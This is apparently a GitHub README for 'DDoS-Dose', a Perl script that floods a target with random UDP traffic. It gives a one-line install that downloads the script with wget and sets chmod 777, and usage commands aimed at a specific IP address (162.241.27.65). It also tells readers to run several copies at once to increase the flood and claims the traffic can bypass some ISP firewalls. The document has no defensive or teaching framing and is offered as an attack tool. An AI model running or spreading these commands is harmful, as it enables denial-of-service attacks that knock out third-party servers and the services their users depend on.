# Script for DDoS-Dose !

## Features

- Generate Random UDP Traffic
- To Random Port & from Random Port
- Require HPC (High Performance Computing) Server
- Can bypass some ISP Firewalls
- Language: Perl
- Spoofed: No

## Installation

One Line Setup for Debian Based distro ~ Ubuntu, Debian

```bash
  apt update -y && apt install perl -y && apt install wget -y && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer4/UDP/random-udp%20%7C%20ID%3AA3/random-udp.pl && chmod 777 *

```
## Usage

```
perl random-udp.pl 162.241.27.65
```
```
YOU CAN RUN IT MULTIPLE TIME TO INCREASE TRAFFIC LIKE - Depends on CPU/RAM
perl random-udp-string.pl 162.241.27.65 & perl random-udp-string.pl 162.241.27.65 & perl random-udp-string.pl 162.241.27.65
---> Multithreading Causing Issue
```
```
- This script pre-configured to send traffic to random port, (Line8) Can be Changed & from random port (Line9)
- This script pre-configured to send random packet size, (Line68), Can be changed!
- Can adjust time by "timeout 30" command,
```

## Authors

- [@cyberceros](https://www.github.com/cyberceros)
## Feedback

If you have any feedback, please reach out to us at n@dultr.in
